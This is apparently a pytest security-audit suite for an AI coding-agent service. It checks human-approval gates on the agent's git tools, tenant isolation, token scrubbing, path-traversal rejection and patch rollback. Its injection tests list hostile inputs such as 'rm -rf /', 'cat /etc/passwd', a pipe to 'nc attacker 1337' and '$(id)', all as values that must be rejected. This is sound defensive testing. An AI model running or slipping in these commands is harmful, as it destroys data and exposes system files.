import datetime
import tempfile
import uuid
from pathlib import Path
from unittest.mock import patch

import pytest
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.agent.patching.applier import (
    PatchApplicationError,
    apply_patch_atomically,
)
from app.agent.patching.validator import (
    validate_patch_proposal,
)
from app.agent.tools.git_tools import (
    CommitChangesTool,
    CreatePullRequestTool,
    PushBranchTool,
)
from app.agent.tools.patch_tools import ApplyPatchTool
from app.core.exceptions import (
    ConflictException,
    ValidationException,
)
from app.core.security import create_access_token, hash_password
from app.models.agent import (
    AgentSession,
    AgentWorkspace,
    WorkspaceStatus,
)
from app.models.auth import Membership, Organization, Role, User
from app.models.base import utc_now
from app.models.project import Project, Repository, RepositoryBranch
from app.schemas.agent import (
    AgentPatchProposalRequest,
    AgentTestExecutionRequest,
    PatchFile,
    PatchHunk,
    TestCommand,
)
from app.services.git_service import GitService, sanitize_branch_name, scrub_sensitive_tokens
from app.services.patch_service import PatchService
from app.services.test_execution_service import TestExecutionService


@pytest.fixture
async def security_audit_context(db_session: AsyncSession, test_user: User):
    """Provisions complete organization, user, repository, session, and workspace context."""
    org = Organization(name="Security Audit Org", slug="sec-audit-org")
    db_session.add(org)
    await db_session.flush()

    membership = Membership(
        user_id=test_user.id,
        organization_id=org.id,
        role=Role.admin,
    )
    db_session.add(membership)

    project = Project(
        name="Security Audit Project",
        organization_id=org.id,
    )
    db_session.add(project)
    await db_session.flush()

    repo = Repository(
        project_id=project.id,
        full_name="forge-sec/audit-repo",
        default_branch="main",
    )
    db_session.add(repo)
    await db_session.flush()

    branch = RepositoryBranch(
        repository_id=repo.id,
        name="main",
        latest_commit_sha="e0e1e2e3e4e5e6e7e8e9f0f1f2f3f4f5f6f7f8f9",
        is_protected=True,
    )
    db_session.add(branch)
    await db_session.flush()

    session = AgentSession(
        user_id=test_user.id,
        project_id=project.id,
        repository_id=repo.id,
        branch_id=branch.id,
    )
    db_session.add(session)
    await db_session.flush()

    tmp_ws_dir = tempfile.mkdtemp(prefix="forge_sec_ws_")
    ws_path = Path(tmp_ws_dir)
    (ws_path / "app").mkdir(parents=True, exist_ok=True)
    target_file = ws_path / "app" / "target.py"
    target_file.write_text("def calculate():\n    return 42\n", encoding="utf-8")

    workspace = AgentWorkspace(
        id=uuid.uuid4(),
        session_id=session.id,
        organization_id=org.id,
        project_id=project.id,
        repository_id=repo.id,
        branch_id=branch.id,
        user_id=test_user.id,
        status=WorkspaceStatus.ACTIVE.value,
        path=str(ws_path),
        base_commit_sha=branch.latest_commit_sha,
        expires_at=utc_now() + datetime.timedelta(hours=1),
    )
    db_session.add(workspace)
    await db_session.commit()
    await db_session.refresh(org)
    await db_session.refresh(project)
    await db_session.refresh(repo)
    await db_session.refresh(session)
    await db_session.refresh(workspace)

    yield {
        "org": org,
        "project": project,
        "repo": repo,
        "session": session,
        "workspace": workspace,
        "ws_path": ws_path,
        "target_file": target_file,
    }


# =========================================================================
# AUDIT 1-4: AUTONOMOUS MUTATION TOOL CALL BLOCKS
# =========================================================================


@pytest.mark.asyncio
async def test_audit_01_autonomous_apply_patch_tool_blocked(db_session: AsyncSession, test_user: User):
    """Security Invariant 1: LLM tool call for apply_patch unconditionally returns APPROVAL_REQUIRED."""
    tool = ApplyPatchTool()
    res = await tool.aexecute(db=db_session, user_id=test_user.id, patch_id=uuid.uuid4())
    assert res.success is False
    assert "APPROVAL_REQUIRED" in res.error
    assert "apply_patch" in res.error


@pytest.mark.asyncio
async def test_audit_02_autonomous_commit_changes_tool_blocked(db_session: AsyncSession, test_user: User):
    """Security Invariant 2: LLM tool call for commit_changes unconditionally returns APPROVAL_REQUIRED."""
    tool = CommitChangesTool()
    res = await tool.aexecute(db=db_session, user_id=test_user.id, workspace_id=uuid.uuid4())
    assert res.success is False
    assert "APPROVAL_REQUIRED" in res.error
    assert "commit_changes" in res.error


@pytest.mark.asyncio
async def test_audit_03_autonomous_push_branch_tool_blocked(db_session: AsyncSession, test_user: User):
    """Security Invariant 3: LLM tool call for push_branch unconditionally returns APPROVAL_REQUIRED."""
    tool = PushBranchTool()
    res = await tool.aexecute(db=db_session, user_id=test_user.id, workspace_id=uuid.uuid4())
    assert res.success is False
    assert "APPROVAL_REQUIRED" in res.error
    assert "push_branch" in res.error


@pytest.mark.asyncio
async def test_audit_04_autonomous_create_pr_tool_blocked(db_session: AsyncSession, test_user: User):
    """Security Invariant 4: LLM tool call for create_pull_request unconditionally returns APPROVAL_REQUIRED."""
    tool = CreatePullRequestTool()
    res = await tool.aexecute(db=db_session, user_id=test_user.id, workspace_id=uuid.uuid4())
    assert res.success is False
    assert "APPROVAL_REQUIRED" in res.error
    assert "create_pull_request" in res.error


# =========================================================================
# AUDIT 5-7: CROSS-TENANT ISOLATION (403 FORBIDDEN)
# =========================================================================


@pytest.mark.asyncio
async def test_audit_05_cross_tenant_workspace_and_patch_rejection(
    client: AsyncClient,
    db_session: AsyncSession,
    security_audit_context: dict,
):
    """Security Invariant 5: Attacker tenant cannot access, propose, apply, or inspect victim's workspace/patch."""
    workspace = security_audit_context["workspace"]

    attacker = User(
        email="attacker_audit@tenant.org",
        hashed_password=hash_password("AuditPass99!"),
        full_name="Malicious Tenant",
        is_active=True,
    )
    db_session.add(attacker)
    await db_session.commit()

    att_token = create_access_token(str(attacker.id))
    att_headers = {"Authorization": f"Bearer {att_token}"}

    # Attempt to propose patch in victim's workspace -> 403 Forbidden
    res1 = await client.post(
        "/api/v1/agent/patches/propose",
        json={
            "workspace_id": str(workspace.id),
            "session_id": str(workspace.session_id),
            "summary": "Malicious patch injection",
            "files": [
                {
                    "file_path": "app/target.py",
                    "operation": "MODIFY",
                    "hunks": [
                        {
                            "id": "h1",
                            "old_start": 1,
                            "old_lines": 2,
                            "new_start": 1,
                            "new_lines": 2,
                            "old_content": "def calculate():\n    return 42\n",
                            "new_content": "def calculate():\n    return 0\n",
                        }
                    ],
                }
            ],
        },
        headers=att_headers,
    )
    assert res1.status_code == 403

    # Attempt to execute tests in victim's workspace -> 403 Forbidden
    res2 = await client.post(
        f"/api/v1/agent/workspaces/{workspace.id}/tests",
        json={"test_command": {"runner": "pytest", "arguments": ["tests/"]}},
        headers=att_headers,
    )
    assert res2.status_code == 403


# =========================================================================
# AUDIT 8-10: CREDENTIAL ISOLATION & GIT SECURITY
# =========================================================================


def test_audit_08_credential_isolation_token_scrubbing():
    """Security Invariant 8: GitHub installation token is scrubbed and never leaked in logs/stderr."""
    token = "ghs_TEST_SECRET_TOKEN_999888777"
    raw_log = f"git push https://x-access-token:{token}@github.com/org/repo.git main"
    scrubbed = scrub_sensitive_tokens(raw_log)
    assert token not in scrubbed
    assert "x-access-token:[REDACTED]@" in scrubbed


def test_audit_09_remote_url_and_protected_branch_defense():
    """Security Invariant 9: Protected production branches and injection URLs are strictly rejected."""
    with pytest.raises(ValidationException):
        sanitize_branch_name("main")
    with pytest.raises(ValidationException):
        sanitize_branch_name("release/v2.0")
    with pytest.raises(ValidationException):
        sanitize_branch_name("https://attacker.com/repo")
    with pytest.raises(ValidationException):
        sanitize_branch_name("branch;rm -rf /")


# =========================================================================
# AUDIT 11-14: PATCH VALIDATION, HASH DRIFT & ROLLBACK ATOMICITY
# =========================================================================


@pytest.mark.asyncio
async def test_audit_11_shell_injection_rejected_in_test_command(
    client: AsyncClient,
    auth_headers: dict[str, str],
    security_audit_context: dict,
):
    """Security Invariant 11: Shell injection operators (&&, ;, |, $(), `) in test runners are strictly blocked."""
    workspace = security_audit_context["workspace"]

    dangerous_args = [
        ["tests/", "&&", "cat", "/etc/passwd"],
        ["tests/;rm", "-rf", "/"],
        ["tests/ | nc attacker 1337"],
        ["`whoami`"],
        ["$(id)"],
    ]
    for bad_arg in dangerous_args:
        res = await client.post(
            f"/api/v1/agent/workspaces/{workspace.id}/tests",
            json={"test_command": {"runner": "pytest", "arguments": bad_arg}},
            headers=auth_headers,
        )
        assert res.status_code in (400, 422), f"Failed to reject shell operator: {bad_arg}"



def test_audit_12_path_traversal_and_symlink_escape_rejection(security_audit_context: dict):
    """Security Invariant 12: Path traversal, symlinks, absolute paths, and UNC paths are rejected in patch validator."""
    ws_path = security_audit_context["ws_path"]

    invalid_patch_files = [
        PatchFile(
            file_path="../../etc/passwd",
            operation="MODIFY",
            hunks=[],
        ),
        PatchFile(
            file_path="/absolute/path/file.py",
            operation="CREATE",
            hunks=[],
        ),
        PatchFile(
            file_path="\\\\unc\\share\\file.py",
            operation="CREATE",
            hunks=[],
        ),
        PatchFile(
            file_path="app/file\0null.py",
            operation="CREATE",
            hunks=[],
        ),
    ]
    with pytest.raises(ValidationException):
        validate_patch_proposal(files=invalid_patch_files, workspace_root=ws_path)


def test_audit_13_hash_drift_protection(security_audit_context: dict):
    """Security Invariant 13: Patch application raises PATCH_CONFLICT when old_content_hash does not match disk."""
    ws_path = security_audit_context["ws_path"]

    patch_file = PatchFile(
        file_path="app/target.py",
        operation="MODIFY",
        old_content_hash="0000000000000000000000000000000000000000000000000000000000000000",  # mismatched hash
        hunks=[
            PatchHunk(
                id="h1",
                old_start=1,
                old_lines=2,
                new_start=1,
                new_lines=2,
                old_content="def calculate():\n    return 42\n",
                new_content="def calculate():\n    return 100\n",
            )
        ],
    )
    with pytest.raises(ConflictException) as exc:
        validate_patch_proposal(files=[patch_file], workspace_root=ws_path, check_workspace_hashes=True)
    assert "PATCH_CONFLICT" in str(exc.value) or "hash mismatch" in str(exc.value).lower()


def test_audit_14_patch_atomicity_and_automatic_rollback(security_audit_context: dict):
    """Security Invariant 14: If one file application fails, the entire workspace is rolled back atomically."""
    ws_path = security_audit_context["ws_path"]
    target_file = security_audit_context["target_file"]
    original_content = target_file.read_text(encoding="utf-8")

    # File 1 is valid, File 2 will cause a failure (invalid target/hash)
    file1_valid = PatchFile(
        file_path="app/target.py",
        operation="MODIFY",
        hunks=[
            PatchHunk(
                id="h1",
                old_start=1,
                old_lines=2,
                new_start=1,
                new_lines=2,
                old_content="def calculate():\n    return 42\n",
                new_content="def calculate():\n    return 999\n",
            )
        ],
    )
    file2_invalid = PatchFile(
        file_path="app/nonexistent_file.py",
        operation="MODIFY",
        hunks=[
            PatchHunk(
                id="h2",
                old_start=1,
                old_lines=1,
                new_start=1,
                new_lines=1,
                old_content="xyz",
                new_content="abc",
            )
        ],
    )

    with pytest.raises((ValidationException, PatchApplicationError)):
        apply_patch_atomically(ws_path, [file1_valid, file2_invalid])



    # Verify that file1 was NOT permanently modified (rolled back to original content)
    current_content = target_file.read_text(encoding="utf-8")
    assert current_content == original_content


# =========================================================================
# AUDIT 15-20: APPROVAL SPOOFING, EXPIRY & SANDBOX FALLBACK
# =========================================================================


@pytest.mark.asyncio
async def test_audit_15_approval_spoofing_rejected(
    client: AsyncClient,
    db_session: AsyncSession,
    test_user: User,
    auth_headers: dict[str, str],
    security_audit_context: dict,
):
    """Security Invariant 15: Applying a patch when approval status is PENDING or REJECTED is blocked."""
    workspace = security_audit_context["workspace"]
    patch_service = PatchService(db=db_session)

    # Propose patch
    prop = await patch_service.propose_patch(
        user_id=test_user.id,
        request=AgentPatchProposalRequest(
            workspace_id=workspace.id,
            session_id=workspace.session_id,
            summary="Test proposal",
            files=[
                PatchFile(
                    file_path="app/target.py",
                    operation="MODIFY",
                    hunks=[
                        PatchHunk(
                            id="h1",
                            old_start=1,
                            old_lines=2,
                            new_start=1,
                            new_lines=2,
                            old_content="def calculate():\n    return 42\n",
                            new_content="def calculate():\n    return 50\n",
                        )
                    ],
                )
            ],
        ),
    )


    # Attempt to apply when approval is PENDING -> 409 Conflict
    res = await client.post(
        f"/api/v1/agent/patches/{prop.patch_id}/apply",
        headers=auth_headers,
    )
    assert res.status_code == 409


@pytest.mark.asyncio
async def test_audit_17_expired_workspace_mutation_rejected(
    db_session: AsyncSession,
    test_user: User,
    security_audit_context: dict,
):
    """Security Invariant 17: Expired workspaces strictly reject branch creation, commit, and push."""
    workspace = security_audit_context["workspace"]
    workspace.status = WorkspaceStatus.EXPIRED.value
    await db_session.commit()

    git_service = GitService(db=db_session)
    with pytest.raises(ConflictException):
        await git_service.create_branch(user_id=test_user.id, workspace_id=workspace.id)

    with pytest.raises(ConflictException):
        await git_service.commit_changes(user_id=test_user.id, workspace_id=workspace.id)

    with pytest.raises(ConflictException):
        await git_service.push_branch(user_id=test_user.id, workspace_id=workspace.id)


@pytest.mark.asyncio
async def test_audit_20_sandbox_unavailable_does_not_execute_on_host(
    db_session: AsyncSession,
    test_user: User,
    security_audit_context: dict,
):
    """Security Invariant 20: When Docker is unavailable, sandbox reports SANDBOX_UNAVAILABLE without host execution."""
    workspace = security_audit_context["workspace"]
    test_service = TestExecutionService(db=db_session)

    # Mock docker unavailable
    with patch("app.services.sandbox.runner.SandboxRunner.is_docker_available", return_value=False):
        req = AgentTestExecutionRequest(
            test_command=TestCommand(runner="pytest", arguments=["tests/"])
        )
        report = await test_service.execute_test(
            user_id=test_user.id,
            workspace_id=workspace.id,
            request=req,
        )
        assert report.status == "SANDBOX_UNAVAILABLE"
        assert report.exit_code is None or report.exit_code == 127
        assert "not available" in (report.stderr or "").lower()

